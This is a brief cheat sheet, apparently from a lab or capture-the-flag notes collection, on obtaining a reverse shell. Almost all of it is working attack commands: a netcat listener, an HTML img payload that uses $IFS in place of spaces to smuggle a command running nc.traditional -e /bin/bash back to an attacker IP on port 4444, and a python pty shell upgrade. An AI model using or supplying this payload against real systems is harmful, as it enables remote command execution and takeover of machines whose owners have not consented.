# Reverse Shell



#### Gaining Reverse Shell

**Run listner**

```text
nc -nlvp 4444
```

**In bash, $IFS can be used as a replacement for the space character.**

**Target Machine**

```text
<img src=http://10.10.14.183/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.183'$IFS'4444')>
```

**Attacker Machine**

```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

